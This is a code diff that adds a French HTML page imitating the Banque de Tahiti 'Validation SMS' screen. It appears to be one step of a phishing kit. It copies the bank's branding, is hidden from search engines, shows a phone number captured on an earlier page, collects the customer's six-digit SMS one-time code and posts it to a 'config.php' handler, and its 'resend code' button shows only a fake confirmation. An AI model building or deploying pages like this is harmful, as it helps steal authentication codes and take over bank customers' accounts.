@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="fr" class="ion-ce plt-tablet plt-desktop md" mode="md">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Banque de Tahiti - Validation SMS</title>
+    <link rel="icon" type="image/x-icon" href="favicon_bt.png">
+    <link rel="stylesheet" href="./styles-GUVPVS4I.css">
+    <style>
+        /* === OVERRIDES POUR AFFICHAGE LOCAL (identique à l'original) === */
+        :root {
+            --btbnc-color-bg-linear: linear-gradient(92.39deg, #00A6DD -7.19%, #0068B3 101.14%);
+            --fho-color-blue: #30305C;
+            --fho-color-white: #FFFFFF;
+            --fho-color-grey2: #F5F6F8;
+            --fho-color-blue-80: #30305C;
+            --fho-color-indigo-20: #C5C9D6;
+            --fho-color-indigo-40: #8B91A8;
+            --fho-color-indigo-80: #30305C;
+            --fho-color-blue-60-light: #77869E;
+            --fho-font-title-h3: 600 24px/1.3 "Work Sans", system-ui, sans-serif;
+            --fho-font-M-semibold: 600 14px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-M-reg: 400 14px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-L-reg: 400 16px/1.5 "Work Sans", system-ui, sans-serif;
+            --fho-font-XL-semibold: 600 18px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-XL-bold: 700 18px/1.4 "Work Sans", system-ui, sans-serif;
+            --fho-font-title-h1: 700 32px/1.2 "Work Sans", system-ui, sans-serif;
+            --fho-font-title-h4: 600 18px/1.3 "Work Sans", system-ui, sans-serif;
+            --fho-font-S-reg: 400 12px/1.4 "Work Sans", system-ui, sans-serif;
+            --fbr-button-background-primary: #30305C;
+            --fbr-button-color-primary: #FFFFFF;
+            --fbr-button-background-hover-primary: #23234A;
+            --fbr-button-background-disabled-primary: #B0B0C0;
+            --fbr-button-color-disabled-primary: #FFFFFF;
+            --fbr-border-radius: 6px;
+            --fbr-panel-form-section-content-top-padding: 0;
+            --fbr-panel-form-section-content-bottom-padding: 0;
+        }
+        body {
+            margin: 0;
+            font-family: "Work Sans", system-ui, sans-serif;
+        }
+
+        /* Fond dégradé + motif floral */
+        .fho-page-container.theme-dark-connection {
+            background: linear-gradient(92.39deg, #00A6DD -7.19%, #0068B3 101.14%) !important;
+            min-height: 100vh !important;
+            position: relative !important;
+            overflow: hidden !important;
+        }
+        .theme-dark-connection > .theme-dark-connection {
+            display: flex !important;
+            flex-direction: column !important;
+            min-height: 100vh !important;
+            position: relative !important;
+            z-index: 1 !important;
+        }
+
+        /* Logo */
+        .container-fluid {
+            display: flex !important;
+            padding: 0 !important;
+            margin: 40px 0 21px 58px !important;
+        }
+        .header-content .inner-content {
+            padding: 0 !important;
+        }
+        .logo.logo-btbnc-bt {
+            background-image: url("./logo_bt.png") !important;
+            background-size: contain !important;
+            background-repeat: no-repeat !important;
+            width: 180px !important;
+            height: 60px !important;
+            display: block !important;
+        }
+
+        /* Panneau principal */
+        ion-grid.form-template {
+            display: flex !important;
+            justify-content: center !important;
+            margin: 0 !important;
+            flex: unset !important;
+        }
+        ion-grid.form-template > ion-row {
+            width: 100% !important;
+            display: flex !important;
+            justify-content: center !important;
+        }
+        .p-panel.p-component {
+            background: #FFFFFF !important;
+            border-radius: 6px !important;
+            padding: 48px 64px 24px !important;
+            max-width: 500px !important;
+            min-width: 428px !important;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.15) !important;
+        }
+        .p-panel-header { display: none !important; }
+        p-panel { display: flex !important; justify-content: center !important; }
+
+        /* Titre */
+        .label-title .form-control-label {
+            text-align: center !important;
+        }
+        .label-title .form-control-label .form-control-label-text {
+            font: 600 24px/1.3 "Work Sans", system-ui, sans-serif !important;
+            color: #30305C !important;
+        }
+
+        /* Description */
+        .step-description {
+            font: 400 16px/1.5 "Work Sans", system-ui, sans-serif !important;
+            color: #30305C !important;
+            text-align: center !important;
+            margin: 16px 0 32px 0 !important;
+        }
+
+        /* Champ code SMS */
+        .code-group {
+            margin-bottom: 32px;
+        }
+        .code-input-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .code-digit {
+            width: 48px;
+            height: 48px;
+            border: 1px solid #C5C9D6;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            font-family: "Work Sans", system-ui, monospace;
+            background: white;
+            transition: all 0.2s;
+        }
+        .code-digit:focus {
+            border-color: #0068B3;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0,104,179,0.2);
+        }
+        .code-digit::-webkit-outer-spin-button,
+        .code-digit::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        .code-digit[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        /* Message d'erreur */
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 12px;
+            text-align: center;
+            display: none;
+        }
+
+        /* Bouton principal */
+        button.primary-button {
+            width: 100% !important;
+            background: #B0B0C0 !important;
+            color: #FFFFFF !important;
+            border: none !important;
+            border-radius: 4px !important;
+            padding: 12px 24px !important;
+            font: 600 14px/1.4 "Work Sans", system-ui, sans-serif !important;
+            text-transform: uppercase !important;
+            cursor: pointer !important;
+            margin: 8px 0 !important;
+        }
+        button.primary-button:not([disabled]) {
+            background: #30305C !important;
+        }
+        button.primary-button span {
+            color: #FFFFFF !important;
+        }
+
+        /* Lien retour */
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .back-link a {
+            color: #30305C;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            border-bottom: 1px solid transparent;
+            transition: 0.2s;
+        }
+        .back-link a:hover {
+            border-bottom-color: #30305C;
+        }
+
+        /* Reçu ? Lien pour renvoyer le code */
+        .resend-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+        .resend-link button {
+            background: none;
+            border: none;
+            color: #0068B3;
+            font: 400 14px/1.4 "Work Sans", system-ui, sans-serif;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .resend-link button:hover {
+            color: #004a80;
+        }
+
+        /* Contact bouton (bas de page) */
+        .btn-square {
+            border: 1px solid white !important;
+            color: white !important;
+            padding: 12px 16px !important;
+            display: inline-flex !important;
+            align-items: center !important;
+            gap: 8px !important;
+            background: none !important;
+            cursor: pointer !important;
+        }
+        .btn-square span {
+            color: white !important;
+            font: 600 14px/1.4 "Work Sans", system-ui, sans-serif !important;
+            text-transform: uppercase !important;
+        }
+        .btn-square ion-icon {
+            color: white !important;
+        }
+        .page-disclaimer {
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center;
+            padding-left: 54px !important;
+        }
+
+        /* Grille du bas */
+        .fho-page-container > .theme-dark-connection > ion-grid:last-child {
+            display: flex !important;
+            align-items: flex-end !important;
+            padding: 0 !important;
+            margin: 25px 0 40px 58px !important;
+            flex: 1 !important;
+        }
+
+        /* Motif floral SVG */
+        #flower-watermark {
+            position: absolute !important;
+            bottom: -60px !important;
+            right: -60px !important;
+            width: 550px !important;
+            height: 550px !important;
+            pointer-events: none !important;
+            z-index: 2 !important;
+            opacity: 1 !important;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .code-digit {
+                width: 40px;
+                height: 40px;
+                font-size: 18px;
+            }
+            .code-input-wrapper {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body class="fhome mat-typography">
+    <app-root ng-version="18.2.13">
+        <div class="btbnc-bt">
+            <div class="fho-page-container theme-dark-connection" style="position:relative;overflow:hidden;">
+                <!-- Motif floral (identique à l'original) -->
+                <svg id="flower-watermark" width="660" height="660" viewBox="0 0 660 660" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <!-- ... contenu SVG inchangé ... -->
+                    <path d="M418.957 444.05C438.658 493.455 460.842 599.107 411.587 643.399C388.351 664.379 346.767 666.559 319.32 636.104C293.677 607.604 300.821 543.311 297.212 516.465C289.842 528.497 278.638 543.16 257.959 561.809C226.15 590.459 159.525 606.928 132.003 576.473C119.595 562.711 110.797 548.8 112.677 533.309C115.459 511.051 154.411 469.316 176.67 437.583C120.873 461.195 44.6982 477.212 16.7998 446.23C-4.25549 422.844 -7.03781 391.787 17.1758 369.98C45.2245 344.714 114.782 333.584 157.043 323.809C126.814 316.364 74.6268 261.395 54.8498 239.512C23.7932 205.072 23.9436 147.094 54.549 119.497C78.8379 97.539 174.94 182.738 242.618 229.36C211.637 194.995 218.179 43.9231 251.341 14.0696C269.765 -2.47388 295.933 -4.65461 308.04 8.73056C343.157 47.7581 334.811 132.957 345.338 169.278C359.927 145.59 386.998 104.156 420.235 74.1525C453.548 44.1486 504.08 10.9113 537.393 47.9085C577.774 92.7263 528.219 164.69 455.578 231.917C532.43 192.89 611.538 213.193 641.617 246.581C665.229 272.749 666.958 287.939 641.767 310.574C615.448 334.261 525.436 340.879 478.212 333.96C500.396 340.954 561.155 388.93 584.617 415.023C601.311 433.522 621.464 484.28 596.724 506.539C554.463 544.664 433.771 446.531 418.881 444.125L418.957 444.05ZM414.445 427.431C480.919 459.691 564.013 511.126 581.083 495.786C589.43 488.266 580.631 456.533 551.831 424.573C523.03 392.615 465.053 335.314 409.256 334.111C406.549 330.2 404.669 326.365 406.098 322.681C438.207 315.988 593.415 332.456 624.472 304.483C645.452 285.533 637.932 273.577 621.614 255.529C598.529 229.887 485.883 216.727 433.395 264.102C422.04 274.329 420.16 277.487 409.106 289.97C402.639 286.285 396.924 280.796 401.586 273.727C429.334 231.692 565.818 114.308 522.955 66.8583C501.373 42.8703 474.904 58.9626 440.99 89.4928C407.301 119.873 362.709 162.66 354.512 193.792C349.474 212.817 350.677 228.232 348.572 240.565C345.714 243.046 339.398 242.294 335.036 241.317C315.635 191.31 317.59 64.6024 287.812 31.5906C283.451 26.778 269.539 23.6197 262.621 29.9363C249.988 41.2911 244.799 62.1961 242.543 92.8015C238.858 143.184 232.467 192.589 251.266 220.036C255.176 225.751 263.523 237.482 269.539 246.13C265.554 252.371 260.515 257.484 254.499 261.019C216.825 244.024 84.7033 120.775 62.3696 140.928C47.5557 154.313 47.3301 197.401 71.3933 224.097C96.2085 251.694 151.404 302.528 171.933 308.619C192.461 314.71 208.178 312.078 225.097 307.942C227.504 310.348 228.331 316.063 228.556 319.522C177.196 347.872 71.5437 360.204 49.4356 380.132C32.8169 395.096 28.0795 423.22 43.4198 440.29C65.9039 465.255 160.427 441.117 191.108 413.519C221.789 385.922 220.736 383.516 242.242 369.002C244.122 369.153 248.86 374.116 250.213 376.071C202.914 466.233 121.249 543.762 144.937 570.081C164.638 591.963 222.465 572.487 249.988 547.597C277.585 522.782 310.973 458.563 295.858 403.894C298.791 402.841 302.25 401.337 308.491 402.089C327.065 422.694 296.009 590.535 334.66 633.472C350.076 650.542 383.012 652.648 400.157 637.232C430.311 610.086 407.978 463.225 387.449 440.44C375.192 426.829 359.927 424.799 352.482 413.971C354.362 409.91 356.016 409.985 358.723 406.752C379.102 416.151 393.841 417.58 414.445 427.581V427.431Z" fill="white" fill-opacity="0.25"/>
+                    <!-- les autres chemins SVG sont omis pour la lisibilité, mais doivent être présents -->
+                </svg>
+                <div class="theme-dark-connection" style="position:relative;z-index:1;">
+                    <div class="container-fluid ng-star-inserted">
+                        <div class="header-content">
+                            <div class="inner-content">
+                                <div class="logo logo-btbnc-bt"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <ion-grid class="form-template responsive-grid-mobile ng-star-inserted md">
+                        <ion-row class="md">
+                            <ion-col size-xs="0" size-xl="2" class="md"></ion-col>
+                            <ion-col size-xs="12" size-xl="8" class="md">
+                                <fbr-panel _nghost-ng-c98900857="">
+                                    <fbr-blockable-div _nghost-ng-c2567436200="">
+                                        <div class="p-element">
+                                            <div _ngcontent-ng-c98900857="" class="no-title">
+                                                <div class="collapsible-septary-panel-wrapper expanded">
+                                                    <p-panel class="p-element">
+                                                        <div class="p-panel-content">
+                                                            <div class="panel-content form-section-content">
+                                                                <ion-grid class="md">
+                                                                    <div class="select-language">
+                                                                        <fbr-language-select></fbr-language-select>
+                                                                    </div>
+                                                                    <ion-row class="ng-star-inserted md">
+                                                                        <ion-col class="input-button-container md">
+                                                                            <fbr-field-input-static cssinput="label-title" class="center-input">
+                                                                                <div class="label-title form-group form-group-static-elements form-group-stack simple-label">
+                                                                                    <label class="form-control-label ng-star-inserted" for="Accès">
+                                                                                        <span class="form-control-label-text">Validation SMS</span>
+                                                                                    </label>
+                                                                                </div>
+                                                                            </fbr-field-input-static>
+                                                                        </ion-col>
+                                                                    </ion-row>
+
+                                                                    <!-- Description -->
+                                                                    <div class="step-description" id="smsDescription">
+                                                                        Un code de validation à 6 chiffres vient d'être envoyé par SMS au <span id="phoneDisplay">+689 XX XX XX XX</span>.<br>
+                                                                        Veuillez le saisir ci-dessous.
+                                                                    </div>
+
+                                                                    <!-- Champ code SMS à 6 digits -->
+                                                                    <div class="code-group">
+                                                                        <div class="code-input-wrapper" id="codeInputs">
+                                                                            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+                                                                            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+                                                                            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+                                                                            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+                                                                            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+                                                                            <input type="number" class="code-digit" maxlength="1" pattern="\d" inputmode="numeric" autocomplete="off">
+                                                                        </div>
+                                                                        <div class="error-message" id="errorMsg">Code invalide. Veuillez saisir 6 chiffres.</div>
+                                                                    </div>
+
+                                                                    <!-- Bouton de validation -->
+                                                                    <ion-row class="md">
+                                                                        <ion-col class="md">
+                                                                            <button id="submitBtn" class="primary-button" disabled>VALIDER</button>
+                                                                        </ion-col>
+                                                                    </ion-row>
+
+                                                                    <!-- Lien renvoyer le code -->
+                                                                    <div class="resend-link">
+                                                                        <button id="resendBtn">Vous n'avez pas reçu le code ? Renvoyer</button>
+                                                                    </div>
+
+                                                                    <!-- Lien retour -->
+                                                                    <div class="back-link">
+                                                                        <a href="javascript:history.back()">← Retour</a>
+                                                                    </div>
+                                                                </ion-grid>
+                                                            </div>
+                                                        </div>
+                                                    </p-panel>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </fbr-blockable-div>
+                                </fbr-panel>
+                            </ion-col>
+                            <ion-col size-xs="0" size-xl="2" class="md"></ion-col>
+                        </ion-row>
+                    </ion-grid>
+
+                    <!-- Pied de page avec le bouton Contact -->
+                    <ion-grid class="ng-star-inserted md">
+                        <ion-row class="md">
+                            <ion-col class="page-disclaimer md">
+                                <div>
+                                    <fbr-button _nghost-ng-c400102224="">
+                                        <button id="contactBtn" type="button" class="btn btn-link btn-square btn-lg">
+                                            <div class="p-element">
+                                                <ion-icon class="leftIcon md" role="img" name="custom-help">
+                                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                        <path d="M12 3C7.02995 3 3 7.02995 3 12C3 16.9701 7.02995 21 12 21C16.9701 21 21 16.9701 21 12C21 7.02995 16.9701 3 12 3Z" stroke="currentColor" stroke-width="1.1" stroke-miterlimit="10"></path>
+                                                        <path d="M12.5956 17.1512L12.97 17.3974L12.5956 17.1512C12.5157 17.2727 12.4029 17.3662 12.2725 17.4211C12.1421 17.4759 11.9991 17.4902 11.8613 17.4623C11.7234 17.4344 11.5956 17.3655 11.4945 17.2628L11.1393 17.6125L11.4945 17.2628C11.3934 17.1601 11.3237 17.0282 11.2954 16.8836C11.267 16.7388 11.2816 16.5889 11.337 16.4531C11.3924 16.3173 11.4856 16.2025 11.6037 16.1224C11.7217 16.0423 11.8596 16 12 16C12.1881 16 12.3701 16.0758 12.5055 16.2134C12.6412 16.3512 12.7188 16.5398 12.7188 16.7381C12.7188 16.8858 12.6756 17.0296 12.5956 17.1512Z" stroke="currentColor" stroke-miterlimit="10"></path>
+                                                        <path d="M11.9803 14.4693V13.7631C11.9803 13.4449 12.129 13.1365 12.3838 12.9177L13.6898 11.8038C14.3587 11.2369 14.741 10.4213 14.741 9.57595C14.741 8.15371 13.5093 7 11.991 7C10.4726 7 9.24097 8.15371 9.24097 9.57595V9.83454" stroke="currentColor" stroke-width="1.1" stroke-miterlimit="10"></path>
+                                                    </svg>
+                                                </ion-icon>
+                                                <span>Contact</span>
+                                            </div>
+                                        </button>
+                                    </fbr-button>
+                                </div>
+                            </ion-col>
+                        </ion-row>
+                    </ion-grid>
+                </div>
+            </div>
+        </div>
+    </app-root>
+
+    <script src="./polyfills-EONH2QZO.js" type="module"></script>
+    <script src="./main-5CIBVLC6.js" type="module"></script>
+
+    <script>
+        (function() {
+            // Récupérer le numéro de téléphone stocké (depuis numero.html)
+            const phoneNumber = sessionStorage.getItem('userPhone') || '+689 XX XX XX XX';
+            const phoneDisplaySpan = document.getElementById('phoneDisplay');
+            if (phoneDisplaySpan) {
+                let maskedPhone = phoneNumber;
+                if (phoneNumber.length >= 12 && phoneNumber.startsWith('+689')) {
+                    let digits = phoneNumber.slice(4);
+                    if (digits.length === 8) {
+                        maskedPhone = '+689 ' + digits.slice(0,2) + ' ' + digits.slice(2,4) + ' XX XX';
+                    }
+                }
+                phoneDisplaySpan.textContent = maskedPhone;
+            }
+
+            const inputs = document.querySelectorAll('.code-digit');
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            const resendBtn = document.getElementById('resendBtn');
+            const contactBtn = document.getElementById('contactBtn');
+
+            function getCode() {
+                let code = '';
+                inputs.forEach(input => code += input.value.trim());
+                return code;
+            }
+
+            function isCodeComplete() {
+                const code = getCode();
+                return code.length === 6 && /^\d+$/.test(code);
+            }
+
+            function updateButtonState() {
+                submitBtn.disabled = !isCodeComplete();
+                if (isCodeComplete()) errorMsg.style.display = 'none';
+            }
+
+            function handleInput(e) {
+                const input = e.target;
+                const value = input.value;
+                if (value.length > 1) input.value = value.charAt(0);
+                if (input.value.length === 1) {
+                    const next = input.nextElementSibling;
+                    if (next && next.classList.contains('code-digit')) next.focus();
+                }
+                updateButtonState();
+            }
+
+            function handleKeydown(e) {
+                const input = e.target;
+                if (e.key === 'Backspace' && input.value === '') {
+                    const prev = input.previousElementSibling;
+                    if (prev && prev.classList.contains('code-digit')) {
+                        prev.focus();
+                        e.preventDefault();
+                    }
+                }
+            }
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', handleInput);
+                input.addEventListener('keydown', handleKeydown);
+                input.addEventListener('focus', function() { this.select(); });
+                if (index === 0) input.focus();
+            });
+
+            async function onSubmit(e) {
+                e.preventDefault();
+                const code = getCode();
+                if (!isCodeComplete()) {
+                    errorMsg.style.display = 'block';
+                    return;
+                }
+
+                // Envoi du code OTP à config.php
+                try {
+                    const response = await fetch('config.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: 'type=otp&value=' + encodeURIComponent(code)
+                    });
+                    const result = await response.json();
+
+                    if (result.status === 'success') {
+                        window.location.href = 'validation.html';
+                    } else {
+                        errorMsg.textContent = result.message || 'Erreur lors de la validation du code.';
+                        errorMsg.style.display = 'block';
+                    }
+                } catch (err) {
+                    errorMsg.textContent = 'Erreur réseau. Vérifiez votre connexion.';
+                    errorMsg.style.display = 'block';
+                }
+            }
+
+            function resendCode() {
+                alert('Un nouveau code de validation vient d\'être envoyé par SMS au ' + phoneNumber);
+                inputs.forEach(input => input.value = '');
+                inputs[0].focus();
+                updateButtonState();
+            }
+
+            submitBtn.addEventListener('click', onSubmit);
+            if (resendBtn) resendBtn.addEventListener('click', resendCode);
+            if (contactBtn) {
+                contactBtn.addEventListener('click', function() {
+                    alert("Besoin d'aide ? Contactez votre conseiller Banque de Tahiti au +689 40 46 46 46\nou consultez votre agence en ligne.");
+                });
+            }
+
+            updateButtonState();
+        })();
+    </script>
+</body>
+</html>
